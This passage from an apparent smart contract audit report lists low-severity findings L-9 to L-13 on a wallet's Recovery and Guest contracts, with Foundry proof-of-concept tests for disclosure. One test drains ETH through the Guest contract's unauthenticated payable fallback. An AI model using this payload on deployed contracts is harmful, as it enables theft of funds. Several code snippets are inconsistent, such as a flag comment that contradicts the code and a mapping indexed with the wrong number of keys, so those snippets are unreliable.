      return true;
    }
  }
```

### [L-9] Unbounded growth of recovery queue via `queuePayload` allows storage bloat

**Description** The Recovery contract maintains a `queuedPayloadHashes` mapping that stores arrays of payload hashes for each wallet-signer combination. When `queuePayload()` is called, it performs signature validation and then unconditionally appends the new payload hash to the corresponding array without any bounds checking or cleanup logic.

The function only verifies that the provided signature matches the specified signer before adding entries to the queue. No mechanism exists within the contract to remove processed payloads, expire old entries, or limit the total number of queued items per wallet-signer pair. Since any account can call `queuePayload()` with valid signatures from signers they control, the storage arrays can be expanded arbitrarily.

While the contract's core functionality relies on `timestampForQueuedPayload` lookups rather than array iteration, the unbounded growth creates persistent on-chain storage bloat that accumulates over time.

**Impact** 
1. The primary impact is on-chain storage bloat as the queuedPayloadHashes arrays grow without bounds. This may contribute to increased node synchronization and archival costs across the network. 

2. The current contract implementation does not iterate over these arrays, so there is no immediate execution denial-of-service risk or threat to protocol funds.

**Recommended mitigation**
1. Consider implementing a cleanup mechanism to prevent unbounded storage growth. One approach could be to add a maximum queue size per wallet-signer combination, automatically removing the oldest entries when the limit is reached. 

2. Alternatively, consider implementing a time-based expiration system that removes payload hashes after a reasonable period, or add administrative functions to prune processed or stale entries. The specific approach should balance storage efficiency with the protocol's operational requirements for payload queuing and processing.

### [L-10] `_dispatchGuest` of `Guest.sol` fails silently via behaviorOnError = 3 leading to wrong emission of `Guest.CallSucceeded` event

**Description** The `_dispatchGuest` function in `Guest.sol` mishandles sub-calls with `behaviorOnError = 3`. The `Payload.fromPackedCalls` function in `Payload.sol` extracts `behaviorOnError` as `(flags >> 6) & 0x03`, allowing values 0, 1, 2, or 3.

```solidity
 function fromPackedCalls(
    bytes calldata packed
  ) internal view returns (Decoded memory _decoded) {
    [...]
    // Last 2 bits are directly mapped to the behavior on error
    //@report-written since only 3 error cases are defined, need to check what would happen if error code == 0x03 happens to occur
    _decoded.calls[i].behaviorOnError = (flags & 0xC0) >> 6;
  }
```

In `_dispatchGuest`, failed sub-calls (success == false) are handled in an *if (!success) block, but behaviorOnError = 3* skips all branches (0: ignore, 1: revert, 2: abort). 

Execution continues to the event emission block, where if `(!success && tx.behaviorOnError == 3)` evaluates to true, this will emit `CallSucceeded` event  despite the failure due to unaccepted behaviorOnError value. This causes a silent failure, misleading off-chain indexers and users into believing the call succeeded.

**Impact** Breaks observability, as off-chain systems (e.g., indexers, user interfaces) rely on accurate event emissions to track transaction outcomes. Users may assume a transaction succeeded when it failed, leading to potential accounting errors or user confusion in batched transactions. No direct fund loss occurs, but the incorrect event emission impacts protocol correctness.

**Proof of Concepts**
1. Create a test case that constructs a packed payload with a sub-call having `behaviorOnError = 3`.
2. Ensure the sub-call fails by not having enough balance in `Guest` contract.
3. Verify that the `CallSucceeded` event is emitted despite the failure.

Find the proof of code in the test file [`Guest.t.sol`](test/modules/guest/Guest.t.sol):
<details>
<summary>Proof of Code</summary>

```solidity
  function test_fallback_Success_With_Invalid_Behavior_On_Error_set_as_3() external {
    uint8 globalFlag = 0x11; // 00010001 binary
    address randomAddress = makeAddr("random address");
    address[] memory parentWallets = new address[](0);
    Payload.Call[] memory calls = new Payload.Call[](1);
    calls[0] = Payload.Call({
      to: randomAddress,
      value: uint256(100000000000000000),
      data: bytes(""),
      gasLimit: uint256(0),
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: uint256(3)
    });
    Payload.Decoded memory decodedNew = Payload.Decoded({
      kind: Payload.KIND_TRANSACTIONS,
      noChainId: false,
      // Transaction kind
      calls: calls,
      space: uint256(0),
      nonce: uint256(0),
      // Message kind
      message: bytes(""),
      // Config update kind
      imageHash: bytes32(0),
      // Digest kind for 1271
      digest: bytes32(0),
      // Parent wallets
      parentWallets: parentWallets
    });
    // Call flags = 0xC0 to 0xC3 for behaviorOnError = 3
    // We want self call to avoid providing address, so bit 0 = 1
    // behaviorOnError = 3 → bits 6-7 = 11
    // So: 11000001 = 0xC1
    uint8 callFlags = 0xC2; // Self call + behaviorOnError = 3
    bytes memory packed = abi.encodePacked(
      uint8(globalFlag), // 0x11
      uint8(callFlags), // 0xC2
      randomAddress,
      uint256(100000000000000000)
    );
    
    bytes32 opHash = Payload.hashFor(decodedNew, address(guest));
    vm.expectEmit(true, true, true, true);
    emit CallSucceeded(opHash, 0);
    vm.prank(address(guest));
    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
  }
```
</details>

**Recommended mitigation**
Add default case or require behaviorOnError ≤ 2:

```solidity
if (behaviorOnError > 2) revert InvalidBehavior();
```
or

```solidity
if (!success) {
    if (behaviorOnError == 0) { /* ignore */ }
    else if (behaviorOnError == 1) { /* revert */ }
    else if (behaviorOnError == 2) { /* abort */ }
    else { revert InvalidBehavior(); }   // <-- catch 3
}
```

### [L-11] `Guest.sol` allows anyone to drain ETH from its balance through unauthenticated payable fallback

**Description** The *Guest contract* implements a **payable fallback function** with no access control that decodes arbitrary payloads and executes calls via `LibOptim.call()`. While delegate calls are explicitly blocked, regular calls with ETH value transfers are permitted without restriction enabling any external account to invoke the fallback and transfer ETH from the Guest contract's balance to arbitrary addresses.

Code Example from `Guest.sol`

```solidity
@>  fallback() external payable {
      Payload.Decoded memory decoded = Payload.fromPackedCalls(msg.data);
      console2.log(decoded.noChainId);
      bytes32 opHash = Payload.hash(decoded);
      _dispatchGuest(decoded, opHash);
  }
```
In `_dispatchGuest` the calls are executed as:

```solidity
bool success = LibOptim.call(call.to, call.value, gasLimit == 0 ? gasleft() : gasLimit, call.data);
```
**Impact** If the Guest contract ever receives ETH (through accidental transfers, self-destruct recipients, or other means), any external party can craft a malicious payload to drain all ETH to an arbitrary address. 

While the README states Guest is a "helper module" not intended to hold funds, the contract's payable nature means ETH can accumulate, and the lack of access control creates an unnecessary attack surface. Marking this issue as low severity due to the intended usage, but it remains a risk.

**Proof of Concepts**
1. Create a payload that encodes a call transferring ETH from Guest to an attacker-controlled address.
2. Invoke the payable fallback with this payload.
3. Verify that the ETH balance of Guest decreases and the attacker address receives the funds.

Find the proof of code in the test file [`Guest.t.sol`](test/modules/guest/Guest.t.sol):

<details>
<summary>Proof of Code</summary>

```solidity
function test_fallback_For_Funds_Withdrawal_By_UnAuthorized_Users() external {
    uint8 globalFlag = 0x11; // 00010001 binary
    address myAddress = makeAddr("my address");
    vm.deal(myAddress, 0);
    address[] memory parentWallets = new address[](0);
    Payload.Call[] memory calls = new Payload.Call[](1);
    calls[0] = Payload.Call({
      to: myAddress,
      value: uint256(10000000000000000000),//10 ether
      data: bytes(""),
      gasLimit: uint256(0),
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: uint256(0)
    });
    Payload.Decoded memory decodedNew = Payload.Decoded({
      kind: Payload.KIND_TRANSACTIONS,
      noChainId: false,
      // Transaction kind
      calls: calls,
      space: uint256(0),
      nonce: uint256(0),
      // Message kind
      message: bytes(""),
      // Config update kind
      imageHash: bytes32(0),
      // Digest kind for 1271
      digest: bytes32(0),
      // Parent wallets
      parentWallets: parentWallets
    });

    uint8 callFlags = 0x02; // call has only value
    bytes memory packed = abi.encodePacked(
      uint8(globalFlag), // 0x11
      uint8(callFlags), // 0x02
      myAddress,
      uint256(10000000000000000000) //10 ether
    );
    
    bytes32 opHash = Payload.hashFor(decodedNew, address(guest));
    vm.expectEmit(true, true,true,true);
    emit CallSucceeded(opHash, 0);
    uint256 guestInitialBalance = 20 ether;
    hoax(address(guest),guestInitialBalance);
    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
    assertEq(address(guest).balance, 10 ether, "Guest balance not reduced");
    assertEq(myAddress.balance, 10 ether, "Balance not received");
}
```
</details>

**Recommended mitigation** 
1. Implement access control: If ETH handling is intentional, add authorization checks before allowing value transfers from the Guest contract's balance.

2. Remove payable fallback: If ETH transfers are not required, change the fallback function to non-payable to prevent any ETH from being sent to the contract.
   
3. Alternatively, implement a whitelist mechanism to restrict which addresses can invoke the fallback function for value transfers.

### [L-12] Gas precheck doesn't account for `EIP-150's 63/64 rule`, causing calls to receive less gas than expected

**Description** The gas precheck logic in `_dispatchGuest` of `Guest.sol`  and `_execute` of `Calls.sol` calculates the gas to forward to sub-calls based on the `gasLimit` specified in the payload. If `gasLimit` is zero, it forwards all remaining gas (`gasleft()`). However, this does not account for *EIP-150's 63/64 rule*, which reduces the gas available to a called contract to 63/64 of the gas sent to it.

When a user specifies gasLimit = X, the check passes if gasleft() >= X, but the actual call may only receive approximately X * 63/64 ≈ 0.984X gas. For calls requiring exactly X gas, this -1.6% shortfall causes unexpected out-of-gas failures despite passing the precheck.

Code Example from `Guest.sol`:

```solidity
if (gasLimit != 0 && gasleft() < gasLimit) {
      revert Calls.NotEnoughGas(_decoded, i, gasleft());
    }
```
Example Secnario:
1. User calculates that a call needs exactly 100,000 gas
2. Sets gasLimit = 100,000
3. Check passes: gasleft() = 100,000 >= 100,000
4. Call forwards only ~98,437 gas due to EIP-150
5. Call fails with OOG, despite seeming to have enough gas

**Impact** This creates user confusion and requires trial-and-error to find working gas limits. While not a critical security issue (users can work around it by adding a buffer), it degrades user experience and doesn't match the expected behavior suggested by the `NotEnoughGas` error name.

**Recommended mitigation**
Consider one of the following approaches:

1. Adjust the precheck to account for the 63/64 rule:

```diff
- if (gasLimit != 0 && gasleft() < gasLimit) {
+ if (gasLimit != 0 && gasleft() < (gasLimit * 64 / 63 + 1)) {
    revert NotEnoughGas(_decoded, i, gasleft());
}
```

2. Update documentation and error messages to clarify that gasLimit is a soft limit and callers should add a buffer (e.g., 2%) to account for EIP-150 reductions.

### [L-13] Recovery module lacks mechanism to remove expired or executed payloads from `queuedPayloadHashes` in `Recovery.sol`

**Description** The `Recovery` module maintains a mapping `queuedPayloadHashes` that stores arrays of payload hashes for each wallet-signer combination. When a payload is queued via `queuePayload()`, its hash is appended to the corresponding array. However, there is no mechanism to remove payload hashes from this array once they have been executed or have expired.

Over time, this leads to storage bloat that increases gas costs for operations querying or iterating over the array.

Code Example from `Recovery.sol`
```solidity
mapping(address => mapping(address => uint256)) public timestampForQueuedPayload;

mapping(address => mapping(address => bytes32[])) public queuedPayloadHashes;

function queuePayload(...) external {


    if (timestampForQueuedPayload[_wallet][_signer][payloadHash] != 0) {
        revert AlreadyQueued(_wallet, _signer, payloadHash);
    }
    timestampForQueuedPayload[_wallet][_signer][payloadHash] = block.timestamp;
    queuedPayloadHashes[_wallet][_signer].push(payloadHash);
@>  // No removal mechanism for executed/expired payloads
}
```

**Impact** Unbounded array growth increases gas costs for users over time.

**Recommended mitigation**
Add a function to allow removal of executed or expired recovery payloads:

```solidity
function removeExpiredPayloads(
    address _wallet, 
    address _signer, 
    bytes32[] calldata _payloadHashes,
    uint256 _maxTimelock
) external {
    for (uint256 i = 0; i < _payloadHashes.length; i++) {
        uint256 queuedTime = timestampForQueuedPayload[_wallet][_signer][_payloadHashes[i]];
        
        // Verify payload exists and has expired based on reasonable maximum timelock
        require(
            queuedTime != 0 && block.timestamp > queuedTime + _maxTimelock, 
            "Payload not expired"
        );
        
        delete timestampForQueuedPayload[_wallet][_signer][_payloadHashes[i]];
    }
    
    // Rebuild array without expired entries (or implement swap-and-pop pattern)
    bytes32[] storage hashes = queuedPayloadHashes[_wallet][_signer];
    uint256 writeIndex = 0;
    for (uint256 i = 0; i < hashes.length; i++) {
        if (timestampForQueuedPayload[_wallet][_signer][hashes[i]] != 0) {
            hashes[writeIndex] = hashes[i];
            writeIndex++;
        }
    }
    // Trim array to new length
    while (hashes.length > writeIndex) {
        hashes.pop();
    }
}
```
**Note:** This function should include appropriate access controls to prevent unauthorized removals.